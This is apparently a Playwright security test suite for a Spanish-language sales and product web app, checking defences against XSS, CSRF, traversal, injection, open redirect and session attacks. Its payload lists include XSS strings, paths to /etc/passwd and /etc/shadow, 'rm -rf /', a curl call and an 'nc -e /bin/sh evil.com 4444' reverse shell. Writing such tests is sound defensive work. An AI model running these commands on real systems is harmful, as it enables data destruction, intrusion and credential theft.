import { test, expect } from '@playwright/test'

test.describe('Web Security Vulnerabilities', () => {
  test('should prevent XSS attacks in user inputs', async ({ page }) => {
    await page.goto('/auth/login')

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<svg onload=alert("XSS")>',
      '" onfocus="alert(\'XSS\')" autofocus="',
      '<body onload=alert("XSS")>',
    ]

    for (const payload of xssPayloads) {
      await page.reload()

      const emailInput = page.getByLabel(/email|correo/i).or(page.getByPlaceholder(/email|correo/i))

      if (await emailInput.isVisible()) {
        await emailInput.fill(payload)

        const loginButton = page.getByRole('button', { name: /login|ingresar/i })
        if (await loginButton.isVisible()) {
          await loginButton.click()

          // Wait to see if any alert appears
          await page.waitForTimeout(1000)

          // Check that no script execution occurred
          const alerts = page.locator('[role="alert"]').or(
            page.getByText(/script|javascript/i)
          )

          // Should not show script execution evidence
          const alertCount = await alerts.count()
          expect(alertCount).toBe(0)
        }
      }
    }
  })

  test('should prevent XSS in URL parameters', async ({ page }) => {
    const xssUrls = [
      '/productos?id=<script>alert("XSS")</script>',
      '/ventas?search=<img src=x onerror=alert("XSS")>',
      '/dashboard?tab=javascript:alert("XSS")',
      '/reports?date=<iframe src="javascript:alert(\'XSS\')"></iframe>',
    ]

    for (const url of xssUrls) {
      await page.goto(url)

      // Page should load without executing scripts
      await expect(page.locator('body')).toBeVisible()

      // Should not show any script execution
      const scripts = page.locator('script').filter({ hasText: /alert|javascript:/i })
      const scriptCount = await scripts.count()
      expect(scriptCount).toBe(0)
    }
  })

  test('should prevent CSRF attacks', async ({ page, context }) => {
    // Create two different contexts to simulate CSRF
    const page1 = page
    const page2 = await context.newPage()

    // Page 1: Authenticated user
    await page1.goto('/dashboard')

    // Page 2: Attacker's page trying to perform actions
    await page2.goto('/')

    // Try to submit forms from attacker's page
    const csrfAttempts = [
      () => page2.evaluate(() => {
        const form = document.createElement('form')
        form.action = '/api/sales'
        form.method = 'POST'
        const input = document.createElement('input')
        input.name = 'amount'
        input.value = '100'
        form.appendChild(input)
        document.body.appendChild(form)
        form.submit()
      })
    ]

    for (const attempt of csrfAttempts) {
      try {
        await attempt()
        await page2.waitForTimeout(1000)

        // Should not succeed or should be blocked
        const currentUrl = page2.url()
        expect(currentUrl).not.toContain('/dashboard') // Should not redirect to protected area
      } catch (e) {
        // Expected to fail
      }
    }

    await page2.close()
  })

  test('should validate Content Security Policy', async ({ page }) => {
    await page.goto('/')

    // Check if CSP headers are present
    const csp = await page.evaluate(() => {
      const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]')
      return meta ? meta.getAttribute('content') : null
    })

    // CSP should be present for security
    expect(csp).toBeTruthy()
  })

  test('should prevent clickjacking attacks', async ({ page, context }) => {
    await page.goto('/')

    // Check for X-Frame-Options or CSP frame-ancestors
    const frameOptions = await page.evaluate(() => {
      // This would check response headers in a real scenario
      // For now, check that page doesn't allow framing
      return document.querySelector('iframe') === null
    })

    expect(frameOptions).toBe(true)

    // Try to frame the page (should be blocked)
    const framedPage = await context.newPage()
    await framedPage.setContent(`
      <iframe src="${page.url()}" width="100%" height="400"></iframe>
    `)

    const iframe = framedPage.locator('iframe')
    await expect(iframe).toBeVisible()

    // The iframe should either be blocked or empty
    const iframeContent = await iframe.evaluate(el => el.contentDocument?.body?.textContent || '')
    expect(iframeContent.length).toBeLessThan(100) // Should not load full content

    await framedPage.close()
  })

  test('should prevent directory traversal attacks', async ({ page }) => {
    const traversalPayloads = [
      '/../../../etc/passwd',
      '/..\\..\\..\\windows\\system32\\config\\sam',
      '/api/files/../../../config/database.json',
      '/static/../../../app/config/secrets.json',
      '/uploads/../../../etc/shadow',
    ]

    for (const payload of traversalPayloads) {
      await page.goto(payload)

      // Should not access sensitive files
      const body = page.locator('body')
      await expect(body).toBeVisible()

      // Should show error page or redirect
      const currentUrl = page.url()
      expect(currentUrl).not.toContain('etc/passwd')
      expect(currentUrl).not.toContain('windows')
      expect(currentUrl).not.toContain('config')
    }
  })

  test('should prevent command injection', async ({ page }) => {
    await page.goto('/productos')

    if (page.url().includes('login')) return

    const injectionPayloads = [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& echo "injected"',
      '`whoami`',
      '$(curl http://evil.com)',
      '| nc -e /bin/sh evil.com 4444',
    ]

    // Try injecting in search fields
    const searchInput = page.getByPlaceholder(/buscar/i).or(page.getByLabel(/buscar/i))

    if (await searchInput.isVisible()) {
      for (const payload of injectionPayloads) {
        await searchInput.fill(payload)
        await page.keyboard.press('Enter')
        await page.waitForTimeout(500)

        // Should not execute commands
        const errorMessages = page.getByText(/error|command not found|permission denied/i)
        const hasErrors = await errorMessages.count() > 0

        // Either shows error or handles gracefully
        expect(hasErrors || page.url().includes('productos')).toBeTruthy()
      }
    }
  })

  test('should prevent HTTP parameter pollution', async ({ page }) => {
    const pollutedUrls = [
      '/api/products?id=1&id=2&id=3',
      '/ventas?status=completed&status=pending',
      '/productos?category=food&category=drinks&category=1=1',
      '/users?role=admin&role=user&role=1=1',
    ]

    for (const url of pollutedUrls) {
      await page.goto(url)

      // Should handle parameter pollution gracefully
      const body = page.locator('body')
      await expect(body).toBeVisible()

      // Should not show database errors
      const sqlErrors = page.getByText(/sql|database|syntax/i)
      const sqlErrorCount = await sqlErrors.count()
      expect(sqlErrorCount).toBe(0)
    }
  })

  test('should validate file upload security', async ({ page }) => {
    await page.goto('/productos')

    if (page.url().includes('login')) return

    const fileInputs = page.locator('input[type="file"]')

    if (await fileInputs.first().isVisible()) {
      // Try uploading malicious files
      const maliciousFiles = [
        'evil-script.php',
        'xss-attack.html',
        'malware.exe',
        'large-file.zip', // Could be too big
        'path-traversal../../../etc/passwd',
      ]

      for (const filename of maliciousFiles) {
        try {
          // Create a mock file
          const fileInput = fileInputs.first()
          await fileInput.setInputFiles({
            name: filename,
            mimeType: 'text/plain',
            buffer: Buffer.from('malicious content')
          })

          await page.waitForTimeout(500)

          // Should reject malicious files
          const errorMessages = page.getByText(/error|invalid|not allowed|too large/i)
          const hasErrors = await errorMessages.count() > 0

          expect(hasErrors).toBeTruthy()
        } catch (e) {
          // Expected to fail for malicious files
        }
      }
    }
  })

  test('should prevent session fixation', async ({ page, context }) => {
    // Simulate session fixation attack
    const attackerPage = await context.newPage()
    const victimPage = await context.newPage()

    // Attacker creates a session
    await attackerPage.goto('/auth/login')

    // Attacker gets session ID (simulated)
    const attackerSessionId = 'attacker-session-123'

    // Victim is tricked into using attacker's session
    await victimPage.goto(`/auth/login?session=${attackerSessionId}`)

    // Victim logs in
    const victimEmailInput = victimPage.getByLabel(/email|correo/i)
    const victimPasswordInput = victimPage.getByLabel(/password|contraseña/i)
    const victimLoginButton = victimPage.getByRole('button', { name: /login|ingresar/i })

    if (await victimEmailInput.isVisible()) {
      await victimEmailInput.fill('victim@example.com')
      await victimPasswordInput.fill('victimpassword')
      await victimLoginButton.click()

      // Should generate new session, not use attacker's session
      await page.waitForTimeout(1000)
      const currentUrl = victimPage.url()

      // Should be logged in with victim's credentials
      expect(currentUrl).not.toContain('login')
    }

    await attackerPage.close()
    await victimPage.close()
  })

  test('should prevent open redirect vulnerabilities', async ({ page }) => {
    const redirectPayloads = [
      '/auth/login?redirect=http://evil.com',
      '/dashboard?next=//evil.com',
      '/api/auth/callback?url=http://evil.com/admin',
      '/logout?returnUrl=javascript:alert("XSS")',
      '/login?redirect=//evil.com%2f@evil.com',
    ]

    for (const payload of redirectPayloads) {
      await page.goto(payload)

      // Should not redirect to external domains
      const currentUrl = page.url()
      expect(currentUrl).not.toContain('evil.com')
      expect(currentUrl).not.toContain('javascript:')

      // Should stay within the application domain
      expect(currentUrl).toContain('localhost') // or the app domain
    }
  })

  test('should validate HTTPS enforcement', async ({ page }) => {
    // Check if the app enforces HTTPS in production
    const isLocalhost = page.url().includes('localhost')

    if (!isLocalhost) {
      // In production, should redirect HTTP to HTTPS
      const response = await page.request.get(page.url().replace('https://', 'http://'))

      // Should redirect to HTTPS
      expect(response.status()).toBe(301) // or 302
      expect(response.headers()['location']).toContain('https://')
    }
  })

  test('should prevent mass assignment vulnerabilities', async ({ page }) => {
    await page.goto('/productos')

    if (page.url().includes('login')) return

    // Try to update protected fields
    const protectedFields = [
      'created_at',
      'updated_at',
      'id',
      'created_by',
      'role',
      'is_admin',
      'password_hash',
    ]

    const updateButton = page.getByRole('button', { name: /editar|modificar/i }).first()

    if (await updateButton.isVisible()) {
      await updateButton.click()

      // Try to inject protected fields
      for (const field of protectedFields) {
        const fieldInput = page.locator(`input[name="${field}"]`).or(
          page.locator(`[data-field="${field}"]`)
        )

        if (await fieldInput.isVisible()) {
          // Should not allow modification of protected fields
          const isDisabled = await fieldInput.isDisabled()
          const isReadOnly = await fieldInput.getAttribute('readonly')

          expect(isDisabled || isReadOnly).toBeTruthy()
        }
      }
    }
  })

  test('should validate input length limits', async ({ page }) => {
    await page.goto('/auth/login')

    const emailInput = page.getByLabel(/email|correo/i).or(page.getByPlaceholder(/email|correo/i))

    if (await emailInput.isVisible()) {
      // Try extremely long input
      const longInput = 'a'.repeat(10000) + '@example.com'
      await emailInput.fill(longInput)

      const loginButton = page.getByRole('button', { name: /login|ingresar/i })
      if (await loginButton.isVisible()) {
        await loginButton.click()

        // Should handle gracefully
        await expect(page.locator('body')).toBeVisible()

        // Should not crash the application
        const currentUrl = page.url()
        expect(typeof currentUrl).toBe('string')
      }
    }
  })

  test('should prevent timing attacks on authentication', async ({ page }) => {
    await page.goto('/auth/login')

    const emailInput = page.getByLabel(/email|correo/i).or(page.getByPlaceholder(/email|correo/i))
    const passwordInput = page.getByLabel(/password|contraseña/i).or(page.getByPlaceholder(/password|contraseña/i))
    const loginButton = page.getByRole('button', { name: /login|ingresar/i })

    if (await emailInput.isVisible() && await passwordInput.isVisible() && await loginButton.isVisible()) {
      const timings: number[] = []

      // Test different email lengths to check for timing differences
      const testEmails = [
        'a@b.com',      // Short
        'verylongemailaddress@b.com', // Long
        'nonexistent@b.com', // Non-existent
      ]

      for (const email of testEmails) {
        const startTime = Date.now()

        await emailInput.fill(email)
        await passwordInput.fill('wrongpassword')
        await loginButton.click()

        // Wait for response
        await page.waitForTimeout(500)
        const endTime = Date.now()

        timings.push(endTime - startTime)
      }

      // Timings should be similar (within 20% difference)
      const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length
      const maxDeviation = avgTiming * 0.2 // 20% deviation allowed

      for (const timing of timings) {
        expect(Math.abs(timing - avgTiming)).toBeLessThan(maxDeviation)
      }
    }
  })
})








